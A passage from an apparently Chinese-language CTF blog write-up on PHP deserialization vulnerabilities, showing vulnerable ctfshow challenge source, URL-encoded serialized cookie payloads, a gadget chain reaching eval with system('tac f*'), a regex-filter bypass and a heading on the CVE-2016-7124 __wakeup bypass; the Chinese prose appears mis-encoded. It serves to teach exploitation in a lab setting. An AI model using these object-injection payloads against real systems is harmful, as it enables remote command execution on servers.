class="hljs-string">&#x27;;&quot;;&#125;&#x27;</span>; <span class="hljs-comment">// æ„é€ åºåˆ—åŒ–å¯¹è±¡</span><br><span class="hljs-variable">$test_unser</span> = unserialize(<span class="hljs-variable">$pp</span>); <span class="hljs-comment">// ååºåˆ—åŒ–åŒæ—¶è§¦å‘_destructå‡½æ•°</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210612155638097.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="ctf-é¢˜"><a href="#ctf-é¢˜" class="headerlink" title="ctf é¢˜"></a>ctf é¢˜</h2><h3 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>)&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;isVip=<span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> ctfShowUser();<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;checkVip())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;vipOneKeyGetFlag();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>payloadï¼š</p>
<blockquote>
<p>GET:username=xxxxxx&amp;password=xxxxxx</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = unserialize(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;checkVip())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;vipOneKeyGetFlag();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>payloadï¼š</p>
<blockquote>
<p>GET:username=xxxxxx&amp;password=xxxxxx Cookie:user=O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;username!==<span class="hljs-keyword">$this</span>-&gt;password)&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>              &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = unserialize(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;checkVip())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;vipOneKeyGetFlag();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>GET ä¼ å…¥çš„<code>usernameå’Œpassword</code>è¿›å…¥<code>login</code>ï¼Œåˆ¤æ–­ååºåˆ—åŒ–å¯¹è±¡<code>user</code>åä¼ å…¥çš„<code>usernameå’Œpassword</code>æ˜¯å¦ç­‰äº<code>login</code>ä¼ å…¥çš„(å³ GET ä¼ å…¥çš„ï¼‰ä¸¤ä¸ªå€¼ï¼Œè€Œ<code>vipOneKeyGetFlag</code>è¦æ±‚ä¸¤ä¸ªå€¼ä¸ç›¸ç­‰</p>
<p>payloadï¼š</p>
<blockquote>
<p>GET:username=a&amp;password=b Cookie:O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%22a%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%22b%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class=<span class="hljs-keyword">new</span> info();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class-&gt;getInfo();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">info</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;user;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = unserialize(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>    <span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å®šä½åˆ° evalï¼Œæ˜¾ç„¶éœ€è¦ cat æŸ¥çœ‹ flag</p>
<blockquote>
<p>$code=â€system(â€˜tac f*â€˜)â€</p>
</blockquote>
<p>é‚£ä¹ˆå°±è¦ä½¿ç”¨<code>getInfo</code>æ–¹æ³•ï¼Œä»è€Œéœ€è¦å®ä¾‹åŒ–ç±»<code>backDoor</code>è€Œä¸æ˜¯ç±»<code>Info</code>ï¼Œæ„é€ å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class=<span class="hljs-keyword">new</span> backDoor();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&quot;system(&#x27;tac f*&#x27;);&quot;</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> ctfShowUser();<br><span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-comment">//åºåˆ—åŒ–$aï¼šO:11:&quot;ctfShowUser&quot;:1:&#123;s:5:&quot;class&quot;;O:8:&quot;backDoor&quot;:1:&#123;s:14:&quot;backDoorcode&quot;;s:17:&quot;system(&#x27;tac f*&#x27;);&quot;;&#125;&#125;</span><br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œä¼šæå‡ºä¸€ä¸ªé—®é¢˜ï¼Œåœ¨ä¸Šé¢çš„ PHP åºåˆ—åŒ–çš„æ ¼å¼ä¸­æåˆ°ï¼š<strong>public/protected/private åœ¨åºåˆ—åŒ–æ—¶</strong>ï¼Œåºåˆ—åŒ–ä¸ä¼šä¿å­˜æ–¹æ³•ï¼Œé‚£ä¸Šé¢çš„è¿™è¡Œä»£ç èµ·ä»€ä¹ˆä½œç”¨</p>
<blockquote>
<p>$this-&gt;class=new backDoor();</p>
</blockquote>
<p>å…¶å®è¿™é‡Œä¼šæŠŠå®ä¾‹åŒ–çš„<code>backDoor</code>å¯¹è±¡ä¿¡æ¯æ”¾åˆ°<code>ctfShowUser</code>ç±»é‡Œå†å®ä¾‹åŒ–ä¸º<code>ctfShowUser</code>çš„å¯¹è±¡<code>a</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class=<span class="hljs-keyword">new</span> info();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class-&gt;getInfo();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">info</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;user;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$user</span> = unserialize(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>    &#125;<br>    <span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å¯¹æ¯”ä¸Šé¢˜å¢åŠ äº†æ­£åˆ™åŒ¹é…ï¼Œ<code>/[oc]:\d+:/i</code>åŒ¹é…åœ¨å¼•å·å‰çš„å­—æ¯<code>o</code>æˆ–<code>c</code>ï¼Œè¿˜æœ‰å¼•å·åçš„æ•°å­—ï¼Œå†ä¸€ä¸ªå¼•å·</p>
<p>å³åŒ¹é…æ ¼å¼<code>x : num :</code></p>
<p>ååºåˆ—åŒ–åé¦–å­—æ¯è‚¯å®šæ˜¯<code>o</code>ï¼Œé‚£ä¹ˆå°±åœ¨æ•°å­—å‰åŠ ä¸€ä¸ª<code>+</code></p>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç©ºæ ¼åœ¨ php çš„ urlencode ä¼šç¼–ç ä¸º<code>+</code>ï¼Œå¦‚æœæ­¤æ—¶åœ¨æ•°å­—å‰å†åŠ å…¥<code>+</code>ï¼Œåˆ™ä¼šæŠŠ payload ä¸­çš„<code>+</code>ç¼–ç ä¸º<code>%2B</code></p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211009121949046.png" srcset="/img/loading.gif" lazyload></p>
<p>å»ºè®®åšæ³•æ˜¯ï¼Œå…ˆé€šè¿‡ php çš„ urlencodeï¼Œç„¶åæ‰‹åŠ¨æ’å…¥<code>%2B</code></p>
<p>å½“ç„¶ä¹Ÿå¯ä»¥ä¸åŠ  urlencodeï¼Œç„¶åæ·»åŠ <code>+</code>ï¼Œç„¶åæ•´ä½“ç¼–ç ï¼Œä½†æ˜¯å«æœ‰ private æ—¶å¤åˆ¶ä¸äº†ä¸å¯è§çš„å­—ç¬¦ï¼Œæ•…æ­¤åšæ³•åªé€‚åˆä¸å­˜åœ¨ private å±æ€§</p>
<h3 id="SoFun"><a href="#SoFun" class="headerlink" title="SoFun"></a>SoFun</h3><h3 id="CVE-2016-7124-wakeup-çš„ç»•è¿‡ï¼‰"><a href="#CVE-2016-7124-wakeup-çš„ç»•è¿‡ï¼‰" class="headerlink" title="CVE-2016-7124(__wakeup çš„ç»•è¿‡ï¼‰"></a>CVE-2016-7124(__wakeup çš„ç»•è¿‡ï¼‰</h3><p><strong>å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeup()çš„æ‰§è¡Œã€‚</strong></p>
<p>PHP5 &lt; 5.6.25</p>
<p>PHP7 &lt; 7.0.10</p>
<p>åˆ©ç”¨å¦‚ä¸‹</p>
